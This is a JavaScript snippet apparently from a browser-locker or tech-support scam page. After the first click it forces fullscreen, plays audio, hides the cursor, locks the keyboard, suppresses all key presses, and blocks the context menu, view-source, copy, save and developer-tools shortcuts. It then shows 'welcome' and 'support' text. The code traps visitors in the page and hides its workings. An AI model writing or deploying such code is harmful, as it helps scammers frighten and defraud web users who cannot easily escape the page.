
        document.addEventListener('DOMContentLoaded', function () {
            var isPopupVisible = true;
            var music = document.getElementById('music');
            var isPlaying = false;

            function toggleMusic() {
                if (isPlaying) {
                    music.pause();
                } else {
                    music.play();
                }
                isPlaying = !isPlaying;
            }

            function playMusicOnClick() {
                toggleMusic();
                document.removeEventListener('click', playMusicOnClick);
            }

            music.addEventListener('click', toggleMusic);
            document.addEventListener('click', playMusicOnClick);

            var fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;

            if (fullscreenEnabled) {
                document.documentElement.requestFullscreen = document.documentElement.requestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.webkitRequestFullScreen;
                document.cancelFullscreen = document.cancelFullscreen || document.mozCancelFullScreen || document.webkitCancelFullScreen;

                var isFullscreen = false;

                document.addEventListener('click', function () {
                    if (!isFullscreen) {
                        isFullscreen = true;
                        document.documentElement.requestFullscreen();
                        document.body.classList.add('fullscreen');
                        showWelcomeDiv();
                        showSupportText();
                    }
                });

                document.addEventListener('fullscreenchange', function () {
                    isFullscreen = !isFullscreen;
                });
            }

            var modalOverlay = document.getElementById('modal-overlay');
            var modalClose = document.getElementById('modal-close');

            function showModal() {
                modalOverlay.style.display = 'block';
            }

            function closeModal() {
                modalOverlay.style.display = 'none';
            }

            modalClose.addEventListener('click', closeModal);

            showModal();

            function hideCursor() {
                document.documentElement.style.cursor = 'none';
            }

            document.addEventListener('click', function () {
                hideCursor();
                document.removeEventListener('click', hideCursor);
                if (isPopupVisible) {
                    closeModal();
                    isPopupVisible = false;
                }
            });

            var acceptButton = document.getElementById('modal-accept');
            var dismissButton = document.getElementById('modal-dismiss');

            acceptButton.addEventListener('click', closeModal);
            dismissButton.addEventListener('click', closeModal);

            document.addEventListener('contextmenu', function (event) {
                event.preventDefault();
            });

            document.addEventListener('keydown', function (e) {
                if (e.ctrlKey && (e.keyCode === 'U'.charCodeAt(0) || e.keyCode === 'u'.charCodeAt(0)) ||
                    e.ctrlKey && (e.keyCode === 'C'.charCodeAt(0) || e.keyCode === 'c'.charCodeAt(0)) ||
                    e.ctrlKey && (e.keyCode === 'S'.charCodeAt(0) || e.keyCode === 's'.charCodeAt(0))) {
                    e.preventDefault();
                }
            });

            function preventKeyEvents(event) {
                const blockedKeyCodes = [123];
                const keyCode = event.keyCode || event.which;

                if (blockedKeyCodes.includes(keyCode)) {
                    event.preventDefault();
                    console.log(`Key with code ${keyCode} is blocked.`);
                }
            }

            window.addEventListener('keydown', preventKeyEvents);
        });

        navigator.keyboard.lock();
        document.onkeydown = function (e) {
            return false;
        }

        function showWelcomeDiv() {
            var welcomeDiv = document.getElementById('welcomeDiv');
            welcomeDiv.style.display = 'block';
        }

        function showSupportText() {
            var supportText = document.getElementById('support-text');
            supportText.style.display = 'block';
        }
   